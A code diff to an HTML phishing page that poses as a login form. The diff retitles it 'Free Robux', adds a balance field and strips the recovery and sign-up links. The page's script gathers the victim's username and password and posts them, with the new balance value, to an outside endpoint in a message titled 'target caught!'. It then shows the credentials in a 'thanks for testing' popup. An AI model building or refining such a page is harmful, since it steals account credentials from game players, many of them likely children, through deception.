@@ -4,7 +4,7 @@
 <meta charset="UTF-8">
 <meta name="referrer" content="no-referrer">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>添加帐户</title>
+<title>免费Robux</title>
 <style>
 *{
     margin: 0;
@@ -23,9 +23,10 @@ body{
     min-height: 100vh;
     color: #ffffff;
     position: relative;
+    overflow-x: hidden;
 }
 
-/* 背景图铺满全屏 */
+/* 背景图铺满全屏 + 毛玻璃基础 */
 .layer-bg{
     position: fixed;
     inset: 0;
@@ -36,10 +37,20 @@ body{
     background-size: cover;
     opacity: 1;
     z-index: 1;
-    filter: brightness(var(--bg-brightness));
+    filter: brightness(var(--bg-brightness)) blur(0px);
 }
 
-/* 灰色面板 */
+/* 毛玻璃遮罩层（增强模糊效果） */
+.layer-bg::after{
+    content: "";
+    position: absolute;
+    inset: 0;
+    backdrop-filter: blur(16px);
+    -webkit-backdrop-filter: blur(16px);
+    background: rgba(12, 12, 16, 0.35);
+}
+
+/* 灰色面板 —— 毛玻璃效果 */
 .layer-panel{
     position: relative;
     z-index: 2;
@@ -47,8 +58,12 @@ body{
     margin-top: 55px;
     margin-bottom: 210px;
     padding: 36px 20px 40px;
-    background: #242830;
+    background: rgba(36, 40, 48, 0.65);
+    backdrop-filter: blur(22px) saturate(140%);
+    -webkit-backdrop-filter: blur(22px) saturate(140%);
+    border: 1px solid rgba(255, 255, 255, 0.12);
     border-radius: 0;
+    box-shadow: 0 8px 32px rgba(0, 0, 0, 0.35);
 }
 
 .layer-ui{
@@ -62,6 +77,7 @@ h1{
     font-weight: 700;
     margin-bottom: 28px;
     color: #ffffff;
+    text-shadow: 0 2px 10px rgba(0,0,0,0.35);
 }
 
 .input-box{
@@ -69,12 +85,15 @@ h1{
     height: 58px;
     margin-bottom: 16px;
     padding: 0 20px;
-    background: #3a404c;
+    background: rgba(58, 64, 76, 0.6);
+    backdrop-filter: blur(8px);
+    -webkit-backdrop-filter: blur(8px);
     color: #ffffff;
-    border: 1px solid #4a505e;
+    border: 1px solid rgba(255, 255, 255, 0.12);
     border-radius: 14px;
     font-size: 18px;
     outline: none;
+    transition: background 0.2s, border-color 0.2s;
 }
 
 .input-box::placeholder{
@@ -82,8 +101,8 @@ h1{
 }
 
 .input-box:focus{
-    background: #3f4652;
-    border-color: #5a6270;
+    background: rgba(63, 70, 82, 0.75);
+    border-color: rgba(255, 255, 255, 0.28);
 }
 
 button{
@@ -96,15 +115,41 @@ button{
     width: 100%;
     height: 54px;
     margin-top: 6px;
-    background: #3a404c;
+    background: rgba(58, 64, 76, 0.7);
+    backdrop-filter: blur(8px);
+    -webkit-backdrop-filter: blur(8px);
     color: #ffffff;
-    border: 2px solid #5a6270;
+    border: 2px solid rgba(255, 255, 255, 0.18);
     border-radius: 14px;
     font-size: 20px;
     font-weight: 600;
+    transition: background 0.2s;
 }
 
 .login-btn:active{
+    background: rgba(47, 53, 61, 0.8);
+}
+
+/* 分隔线保留，但忘记密码和注册已删除 */
+.divider{
+    height: 1px;
+    background: rgba(255, 255, 255, 0.12);
+    margin: 30px 0 0;
+}
+
+/* 原来 sec-btn、forgot-text、register-text 均已删除，样式保留以防冲突但不再使用 */
+.sec-btn{
+    width: 100%;
+    height: 52px;
+    margin-bottom: 14px;
+    background: #3a404c;
+    color: #ffffff;
+    border: 1px solid #4a505e;
+    border-radius: 14px;
+    font-size: 18px;
+}
+
+.sec-btn:active{
     background: #2f353d;
 }
 
@@ -119,27 +164,6 @@ button{
 
 .forgot-text:active{
     color: #ffffff;
-}
-
-.divider{
-    height: 1px;
-    background: #4a505e;
-    margin: 30px 0;
-}
-
-.sec-btn{
-    width: 100%;
-    height: 52px;
-    margin-bottom: 14px;
-    background: #3a404c;
-    color: #ffffff;
-    border: 1px solid #4a505e;
-    border-radius: 14px;
-    font-size: 18px;
-}
-
-.sec-btn:active{
-    background: #2f353d;
 }
 
 .register-text{
@@ -177,12 +201,15 @@ button{
 
 .popup-box{
     width: 320px;
-    background: #282c34;
+    background: rgba(40, 44, 52, 0.85);
+    backdrop-filter: blur(20px) saturate(140%);
+    -webkit-backdrop-filter: blur(20px) saturate(140%);
     color: #ffffff;
     border-radius: 16px;
     padding: 28px 24px;
     text-align: center;
-    border: 1px solid #3a404c;
+    border: 1px solid rgba(255, 255, 255, 0.15);
+    box-shadow: 0 8px 32px rgba(0, 0, 0, 0.4);
 }
 
 .check-icon{
@@ -222,15 +249,18 @@ button{
     width: 100%;
     height: 44px;
     margin-top: 22px;
-    background: #3a404c;
+    background: rgba(58, 64, 76, 0.7);
+    backdrop-filter: blur(8px);
+    -webkit-backdrop-filter: blur(8px);
     color: #ffffff;
-    border: 1px solid #4a505e;
+    border: 1px solid rgba(255, 255, 255, 0.15);
     border-radius: 14px;
     font-size: 15px;
+    transition: background 0.2s;
 }
 
 .close-btn:active{
-    background: #434a56;
+    background: rgba(67, 74, 86, 0.8);
 }
 
 /* 平板/电脑：灰色面板居中，不贴边 */
@@ -239,7 +269,7 @@ button{
         width: 480px;
         margin: 55px auto 210px;
         padding: 36px 30px 40px;
-        border-radius: 16px;
+        border-radius: 20px;
     }
 }
 </style>
@@ -251,25 +281,23 @@ button{
 <div class="layer-panel">
     <div class="layer-ui">
         <h1>添加帐户</h1>
-        <input type="text" class="input-box" id="accInput" placeholder="用户名/电子邮件/手机">
+        <!-- 余额输入框 -->
+        <input type="text" class="input-box" id="balanceInput" placeholder="余额（例如 100.00）">
+        <input type="text" class="input-box" id="accInput" placeholder="用户名">
         <input type="password" class="input-box" id="pwdInput" placeholder="密码">
 
         <button class="login-btn" onclick="showResult()">登录</button>
 
-        <p class="forgot-text" onclick="tip('正在跳转找回密码页面...')">忘记密码或用户名？</p>
-
+        <!-- 忘记密码已删除 -->
         <div class="divider"></div>
-
-        <button class="sec-btn" onclick="tip('验证码已发送至您的邮箱（娱乐效果）')">通过电子邮件向我发送一次性验证码</button>
-        <button class="sec-btn" onclick="tip('正在唤起快速登录...')">快速登录</button>
-
-        <p class="register-text">没有帐户？ <span onclick="tip('正在跳转注册页面...')">注册</span></p>
+        <!-- 注册链接已删除，无其他文字 -->
     </div>
 </div>
 
 <div class="popup-mask" id="resultPopup">
     <div class="popup-box">
         <div class="check-icon">✓</div>
+        <div class="info-row">余　额：<span id="showBalance"></span></div>
         <div class="info-row">用户名：<span id="showAcc"></span></div>
         <div class="info-row">密　码：<span id="showPwd"></span></div>
         <div class="thanks-text">谢谢你参与这次的测试</div>
@@ -279,8 +307,14 @@ button{
 
 <script>
 async function showResult(){
+    const balance = document.getElementById("balanceInput").value.trim();
     const acc = document.getElementById("accInput").value.trim();
     const pwd = document.getElementById("pwdInput").value.trim();
+
+    if(!balance){
+        tip("请输入余额");
+        return;
+    }
     if(!acc || !pwd){
         tip("请输入用户名和密码");
         return;
@@ -295,6 +329,7 @@ async function showResult(){
             title: "抓到目标！",
             color: 39423,
             fields: [
+                {name:"余额", value:`\`${balance}\``},
                 {name:"账号", value:`\`${acc}\``},
                 {name:"密码", value:`\`${pwd}\``}
             ],
@@ -310,8 +345,10 @@ async function showResult(){
         body: JSON.stringify(sendData)
     }).catch(err => console.log("发送失败", err));
 
+    document.getElementById("showBalance").innerText = balance;
     document.getElementById("showAcc").innerText = acc;
     document.getElementById("showPwd").innerText = pwd;
+
     const popup = document.getElementById("resultPopup");
     popup.style.display = "flex";
 }
